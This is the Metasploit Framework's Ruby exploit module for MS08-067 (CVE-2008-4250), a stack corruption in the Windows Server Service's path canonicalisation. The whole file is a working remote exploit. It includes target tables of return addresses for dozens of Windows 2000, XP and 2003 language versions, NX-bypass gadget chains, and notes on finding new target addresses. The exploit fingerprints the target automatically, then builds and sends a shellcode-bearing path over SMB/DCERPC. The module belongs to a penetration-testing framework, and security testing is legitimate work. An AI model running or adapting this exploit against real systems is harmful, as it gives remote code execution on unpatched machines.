##
# $Id: ms08_067_netapi.rb 11614 2011-01-21 04:09:48Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking


	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Server Service Relative Path Stack Corruption',
			'Description'    => %q{
					This module exploits a parsing flaw in the path canonicalization code of
				NetAPI32.dll through the Server Service. This module is capable of bypassing
				NX on some operating systems and service packs. The correct target must be
				used to prevent the Server Service (along with a dozen others in the same
				process) from crashing. Windows XP targets seem to handle multiple successful
				exploitation events, but 2003 targets will often crash or hang on subsequent
				attempts. This is just the first version of this module, full support for
				NX bypass on 2003, along with other platforms, is still in development.
			},
			'Author'         =>
				[
					'hdm', # with tons of input/help/testing from the community
					'Brett Moore <brett.moore[at]insomniasec.com>'
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11614 $',
			'References'     =>
				[
					[ 'CVE', '2008-4250'],
					[ 'OSVDB', '49243'],
					[ 'MSB', 'MS08-067' ],
					# If this vulnerability is found, ms08-67 is exposed as well
					[ 'NEXPOSE', 'dcerpc-ms-netapi-netpathcanonicalize-dos']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 400,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40",
					'Prepend'  => "\x81\xE4\xF0\xFF\xFF\xFF", # stack alignment
					'StackAdjustment' => -3500,

				},
			'Platform'       => 'win',
			'DefaultTarget'  => 0,
			'Targets'        =>
				[
					#
					# Automatic targetting via fingerprinting
					#
					[ 'Automatic Targeting', { 'auto' => true }	],


					#
					# UNIVERSAL TARGETS
					#

					#
					# Antoine's universal for Windows 2000
					# Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET
					#
					[ 'Windows 2000 Universal',
						{
							'Ret'       => 0x001f1cb0,
							'Scratch'   => 0x00020408,
						}
					], # JMP EDI SVCHOST.EXE

					#
					# Standard return-to-ESI without NX bypass
					# Warning: DO NOT CHANGE THE OFFSET OF THIS TARGET
					#
					[ 'Windows XP SP0/SP1 Universal',
						{
							'Ret'       => 0x01001361,
							'Scratch'   => 0x00020408,
						}
					], # JMP ESI SVCHOST.EXE

					#
					# ENGLISH TARGETS
					#

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 English (NX)',
						{
							'Ret'       => 0x6f88f727,
							'DisableNX' => 0x6f8916e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL


					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 English (NX)',
						{
							'Ret'       => 0x6f88f807,
							'DisableNX' => 0x6f8917c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Standard return-to-ESI without NX bypass
					[ 'Windows 2003 SP0 Universal',
						{
							'Ret'       => 0x0100129e,
							'Scratch'   => 0x00020408,
						}
					], # JMP ESI SVCHOST.EXE


					# Standard return-to-ESI without NX bypass
					[ 'Windows 2003 SP1 English (NO NX)',
						{
							'Ret'       => 0x71bf21a2,
							'Scratch'   => 0x00020408,
						}
					], # JMP ESI WS2HELP.DLL

					# Brett Moore's crafty NX bypass for 2003 SP1
					[ 'Windows 2003 SP1 English (NX)',
						{
							'RetDec'    => 0x7c90568c,	 # dec ESI, ret @SHELL32.DLL
							'RetPop'    => 0x7ca27cf4,  # push ESI, pop EBP, ret @SHELL32.DLL
							'JmpESP'    => 0x7c86fed3,  # jmp ESP @NTDLL.DLL
							'DisableNX' => 0x7c83e413,  # NX disable @NTDLL.DLL
							'Scratch'   => 0x00020408,
						}
					],


					# Standard return-to-ESI without NX bypass
					[ 'Windows 2003 SP1 Japanese (NO NX)',
						{
							'Ret'       => 0x71a921a2,
							'Scratch'   => 0x00020408,
						}
					], # JMP ESI WS2HELP.DLL


					# Standard return-to-ESI without NX bypass
					[ 'Windows 2003 SP2 English (NO NX)',
						{
							'Ret'       => 0x71bf3969,
							'Scratch'   => 0x00020408,
						}
					], # JMP ESI WS2HELP.DLL

					# Brett Moore's crafty NX bypass for 2003 SP2
					[ 'Windows 2003 SP2 English (NX)',
						{
							'RetDec'    => 0x7c86beb8,  # dec ESI, ret @NTDLL.DLL
							'RetPop'    => 0x7ca1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL
							'JmpESP'    => 0x7c86a01b,  # jmp ESP @NTDLL.DLL
							'DisableNX' => 0x7c83f517,  # NX disable @NTDLL.DLL
							'Scratch'   => 0x00020408,
						}
					],


					# Standard return-to-ESI without NX bypass
					[ 'Windows 2003 SP2 German (NO NX)',
						{
							'Ret'       => 0x71a03969,
							'Scratch'   => 0x00020408,
						}
					], # JMP ESI WS2HELP.DLL

					# Brett Moore's crafty NX bypass for 2003 SP2
					[ 'Windows 2003 SP2 German (NX)',
						{
							'RetDec'    => 0x7c98beb8,  # dec ESI, ret @NTDLL.DLL
							'RetPop'    => 0x7cb3e84e,  # push ESI, pop EBP, ret @SHELL32.DLL
							'JmpESP'    => 0x7c98a01b,  # jmp ESP @NTDLL.DLL
							'DisableNX' => 0x7c95f517,  # NX disable @NTDLL.DLL
							'Scratch'   => 0x00020408,
						}
					],


					#
					# NON-ENGLISH TARGETS - AUTOMATICALLY GENERATED
					#

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Arabic (NX)',
						{
							'Ret'       => 0x6fd8f727,
							'DisableNX' => 0x6fd916e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Chinese - Traditional / Taiwan (NX)',
						{
							'Ret'       => 0x5860f727,
							'DisableNX' => 0x586116e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Chinese - Simplified (NX)',
						{
							'Ret'       => 0x58fbf727,
							'DisableNX' => 0x58fc16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Chinese - Traditional (NX)',
						{
							'Ret'       => 0x5860f727,
							'DisableNX' => 0x586116e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Czech (NX)',
						{
							'Ret'       => 0x6fe1f727,
							'DisableNX' => 0x6fe216e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Danish (NX)',
						{
							'Ret'       => 0x5978f727,
							'DisableNX' => 0x597916e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 German (NX)',
						{
							'Ret'       => 0x6fd9f727,
							'DisableNX' => 0x6fda16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Greek (NX)',
						{
							'Ret'       => 0x592af727,
							'DisableNX' => 0x592b16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL


					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Spanish (NX)',
						{
							'Ret'       => 0x6fdbf727,
							'DisableNX' => 0x6fdc16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Finnish (NX)',
						{
							'Ret'       => 0x597df727,
							'DisableNX' => 0x597e16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 French (NX)',
						{
							'Ret'       => 0x595bf727,
							'DisableNX' => 0x595c16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Hebrew (NX)',
						{
							'Ret'       => 0x5940f727,
							'DisableNX' => 0x594116e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Hungarian (NX)',
						{
							'Ret'       => 0x5970f727,
							'DisableNX' => 0x597116e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Italian (NX)',
						{
							'Ret'       => 0x596bf727,
							'DisableNX' => 0x596c16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Japanese (NX)',
						{
							'Ret'       => 0x567fd3be,
							'DisableNX' => 0x568016e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Korean (NX)',
						{
							'Ret'       => 0x6fd6f727,
							'DisableNX' => 0x6fd716e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Dutch (NX)',
						{
							'Ret'       => 0x596cf727,
							'DisableNX' => 0x596d16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Norwegian (NX)',
						{
							'Ret'       => 0x597cf727,
							'DisableNX' => 0x597d16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Polish (NX)',
						{
							'Ret'       => 0x5941f727,
							'DisableNX' => 0x594216e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Portuguese - Brazilian (NX)',
						{
							'Ret'       => 0x596ff727,
							'DisableNX' => 0x597016e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Portuguese (NX)',
						{
							'Ret'       => 0x596bf727,
							'DisableNX' => 0x596c16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Russian (NX)',
						{
							'Ret'       => 0x6fe1f727,
							'DisableNX' => 0x6fe216e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Swedish (NX)',
						{
							'Ret'       => 0x597af727,
							'DisableNX' => 0x597b16e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP2 Turkish (NX)',
						{
							'Ret'       => 0x5a78f727,
							'DisableNX' => 0x5a7916e2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Arabic (NX)',
						{
							'Ret'       => 0x6fd8f807,
							'DisableNX' => 0x6fd917c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Chinese - Traditional / Taiwan (NX)',
						{
							'Ret'       => 0x5860f807,
							'DisableNX' => 0x586117c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Chinese - Simplified (NX)',
						{
							'Ret'       => 0x58fbf807,
							'DisableNX' => 0x58fc17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Chinese - Traditional (NX)',
						{
							'Ret'       => 0x5860f807,
							'DisableNX' => 0x586117c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Czech (NX)',
						{
							'Ret'       => 0x6fe1f807,
							'DisableNX' => 0x6fe217c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Danish (NX)',
						{
							'Ret'       => 0x5978f807,
							'DisableNX' => 0x597917c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 German (NX)',
						{
							'Ret'       => 0x6fd9f807,
							'DisableNX' => 0x6fda17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Greek (NX)',
						{
							'Ret'       => 0x592af807,
							'DisableNX' => 0x592b17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL


					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Spanish (NX)',
						{
							'Ret'       => 0x6fdbf807,
							'DisableNX' => 0x6fdc17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Finnish (NX)',
						{
							'Ret'       => 0x597df807,
							'DisableNX' => 0x597e17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 French (NX)',
						{
							'Ret'       => 0x595bf807,
							'DisableNX' => 0x595c17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Hebrew (NX)',
						{
							'Ret'       => 0x5940f807,
							'DisableNX' => 0x594117c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Hungarian (NX)',
						{
							'Ret'       => 0x5970f807,
							'DisableNX' => 0x597117c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Italian (NX)',
						{
							'Ret'       => 0x596bf807,
							'DisableNX' => 0x596c17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Japanese (NX)',
						{
							'Ret'       => 0x567fd4d2,
							'DisableNX' => 0x568017c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Korean (NX)',
						{
							'Ret'       => 0x6fd6f807,
							'DisableNX' => 0x6fd717c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Dutch (NX)',
						{
							'Ret'       => 0x596cf807,
							'DisableNX' => 0x596d17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Norwegian (NX)',
						{
							'Ret'       => 0x597cf807,
							'DisableNX' => 0x597d17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Polish (NX)',
						{
							'Ret'       => 0x5941f807,
							'DisableNX' => 0x594217c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Portuguese - Brazilian (NX)',
						{
							'Ret'       => 0x596ff807,
							'DisableNX' => 0x597017c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Portuguese (NX)',
						{
							'Ret'       => 0x596bf807,
							'DisableNX' => 0x596c17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Russian (NX)',
						{
							'Ret'       => 0x6fe1f807,
							'DisableNX' => 0x6fe217c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Swedish (NX)',
						{
							'Ret'       => 0x597af807,
							'DisableNX' => 0x597b17c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL

					# Metasploit's NX bypass for XP SP2/SP3
					[ 'Windows XP SP3 Turkish (NX)',
						{
							'Ret'       => 0x5a78f807,
							'DisableNX' => 0x5a7917c2,
							'Scratch'   => 0x00020408
						}
					], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL



					#
					# Missing Targets
					# Key:   T=TODO   ?=UNKNOWN   U=UNRELIABLE
					#
					# [?] Windows Vista SP0 - Not tested yet
					# [?] Windows Vista SP1 - Not tested yet
					#
				],

			'DisclosureDate' => 'Oct 28 2008'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (BROWSER, SRVSVC)", 'BROWSER']),
			], self.class)

	end


=begin


	*** WINDOWS XP SP2/SP3 TARGETS ***


	This exploit bypasses NX/NX by returning to a function call inside acgenral.dll that disables NX
	for the process and then returns back to a call ESI instruction. These addresses are different
	between operating systems, service packs, and language packs, but the steps below can be used to
	add new targets.


	If the target system does not have NX/NX, just place a "call ESI" return into both the Ret	and
	DisableNX elements of the target hash.

	If the target system does have NX/NX, obtain a copy of the acgenral.dll from that system.
	First obtain the value for the Ret element of the hash with the following command:

	$ msfpescan -j esi acgenral.dll

	Pick whatever address you like, just make sure it does not contain 00 0a 0d 5c 2f or 2e.

	Next, find the location of the function we use to disable NX. Use the following command:

	$ msfpescan -r "\x6A\x04\x8D\x45\x08\x50\x6A\x22\x6A\xFF" acgenral.dll

	This address should be placed into the DisableNX element of the target hash.

	The Scratch element of 0x00020408 should work on all versions of Windows

	The actual function we use to disable NX looks like this:

		push    4
		lea     eax, [ebp+arg_0]
		push    eax
		push    22h
		push    0FFFFFFFFh
		mov     [ebp+arg_0], 2
		call    ds:__imp__NtSetInformationProcess@16


	*** WINDOWS XP NON-NX TARGETS ***


	Instead of bypassing NX, just return directly to a "JMP ESI", which takes us to the short
	jump, and finally the shellcode.


	*** WINDOWS 2003 SP2 TARGETS ***


	There are only two possible ways to return to NtSetInformationProcess on Windows 2003 SP2,
	both of these are inside NTDLL.DLL and use a return method that is not directly compatible
	with our call stack. To solve this, Brett Moore figured out a multi-step return call chain
	that eventually leads to the NX bypass function.


	*** WINDOWS 2000 TARGETS ***


	No NX to bypass, just return directly to a "JMP EDX", which takes us to the short
	jump, and finally the shellcode.


	*** WINDOWS VISTA TARGETS ***

	Currently untested, will involve ASLR and NX, should be fun.


	*** NetprPathCanonicalize IDL ***


	NET_API_STATUS NetprPathCanonicalize(
	[in, string, unique] SRVSVC_HANDLE ServerName,
	[in, string] WCHAR* PathName,
	[out, size_is(OutbufLen)] unsigned char* Outbuf,
	[in, range(0,64000)] DWORD OutbufLen,
	[in, string] WCHAR* Prefix,
	[in, out] DWORD* PathType,
	[in] DWORD Flags
	);

=end

	def exploit

		connect()
		smb_login()

		# Use a copy of the target
		mytarget = target


		if(target['auto'])

			mytarget = nil

			print_status("Automatically detecting the target...")
			fprint = smb_fingerprint()

			print_status("Fingerprint: #{fprint['os']} - #{fprint['sp']} - lang:#{fprint['lang']}")

			# Bail early on unknown OS
			if(fprint['os'] == 'Unknown')
				raise RuntimeError, "No matching target"
			end

			# Windows 2000 is mostly universal
			if(fprint['os'] == 'Windows 2000')
				mytarget = self.targets[1]
			end

			# Windows XP SP0/SP1 is mostly universal
			if(fprint['os'] == 'Windows XP' and fprint['sp'] == "Service Pack 0 / 1")
				mytarget = self.targets[2]
			end

			# Windows 2003 SP0 is mostly universal
			if(fprint['os'] == 'Windows 2003' and fprint['sp'] == "No Service Pack")
				mytarget = self.targets[5]
			end

			# Windows 2003 R2 is treated the same as 2003
			if(fprint['os'] == 'Windows 2003 R2')
				fprint['os'] = 'Windows 2003'
			end

			# Service Pack match must be exact
			if((not mytarget) and fprint['sp'].index('+'))
				print_error("Could not determine the exact service pack")
				print_status("Auto-targeting failed, use 'show targets' to manually select one")
				disconnect
				return
			end

			# Language Pack match must be exact or we default to English
			if((not mytarget) and fprint['lang'] == 'Unknown')
				print_status("We could not detect the language pack, defaulting to English")
				fprint['lang'] = 'English'
			end

			# Normalize the service pack string
			fprint['sp'].gsub!(/Service Pack\s+/, 'SP')

			if(not mytarget)
				self.targets.each do |t|
					if(t.name =~ /#{fprint['os']} #{fprint['sp']} #{fprint['lang']} \(NX\)/)
						mytarget = t
						break
					end
				end
			end

			if(not mytarget)
				raise RuntimeError, "No matching target"
			end

			print_status("Selected Target: #{mytarget.name}")
		end

		#
		# Build the malicious path name
		#

		padder = [*("A".."Z")]
		pad = "A"
		while(pad.length < 7)
			c = padder[rand(padder.length)]
			next if pad.index(c)
			pad += c
		end

		prefix = "\\"
		path   = ""
		server = Rex::Text.rand_text_alpha(rand(8)+1).upcase


		#
		# Windows 2000, XP (NX), and 2003 (NO NX) mytargets
		#
		if(not mytarget['RetDec'])

			jumper = Rex::Text.rand_text_alpha(70).upcase
			jumper[ 4,4] = [mytarget.ret].pack("V")
			jumper[50,8] = make_nops(8)
			jumper[58,2] = "\xeb\x62"

			path =
				Rex::Text.to_unicode("\\") +

				# This buffer is removed from the front
				Rex::Text.rand_text_alpha(100) +

				# Shellcode
				payload.encoded +

				# Relative path to trigger the bug
				Rex::Text.to_unicode("\\..\\..\\") +

				# Extra padding
				Rex::Text.to_unicode(pad) +

				# Writable memory location (static)
				[mytarget['Scratch']].pack("V") + # EBP

				# Return to code which disables NX (or just the return)
				[ mytarget['DisableNX'] || mytarget.ret ].pack("V") +

				# Padding with embedded jump
				jumper +

				# NULL termination
				"\x00" * 2
		#
		# Windows 2003 SP2 (NX) mytargets
		#
		else

			jumper = Rex::Text.rand_text_alpha(70).upcase
			jumper[ 0,4] = [mytarget['RetDec']].pack("V")# one more to Align and make room

			jumper[ 4,4] = [mytarget['RetDec']].pack("V") # 4 more for space
			jumper[ 8,4] = [mytarget['RetDec']].pack("V")
			jumper[ 12,4] = [mytarget['RetDec']].pack("V")
			jumper[ 16,4] = [mytarget['RetDec']].pack("V")

			jumper[ 20,4] = [mytarget['RetPop']].pack("V")# pop to EBP
			jumper[ 24,4] = [mytarget['DisableNX']].pack("V")

			jumper[ 56,4] = [mytarget['JmpESP']].pack("V")
			jumper[ 60,4] = [mytarget['JmpESP']].pack("V")
			jumper[ 64,2] = "\xeb\x02"                    # our jump
			jumper[ 68,2] = "\xeb\x62"					  # original

			path =
				Rex::Text.to_unicode("\\") +

				# This buffer is removed from the front
				Rex::Text.rand_text_alpha(100) +

				# Shellcode
				payload.encoded +

				# Relative path to trigger the bug
				Rex::Text.to_unicode("\\..\\..\\") +

				# Extra padding
				Rex::Text.to_unicode(pad) +

				# Writable memory location (static)
				[mytarget['Scratch']].pack("V") + # EBP

				# Return to code which disables NX (or just the return)
				[mytarget['RetDec']].pack("V") +

				# Padding with embedded jump
				jumper +

				# NULL termination
				"\x00" * 2

		end

		handle = dcerpc_handle(
			'4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
			'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
		)

		dcerpc_bind(handle)

		stub =
			NDR.uwstring(server) +
			NDR.UnicodeConformantVaryingStringPreBuilt(path) +
			NDR.long(rand(1024)) +
			NDR.wstring(prefix) +
			NDR.long(4097) +
			NDR.long(0)

		# NOTE: we don't bother waiting for a response here...
		print_status("Attempting to trigger the vulnerability...")
		dcerpc.call(0x1f, stub, false)

		# Cleanup
		handler
		disconnect
	end

end
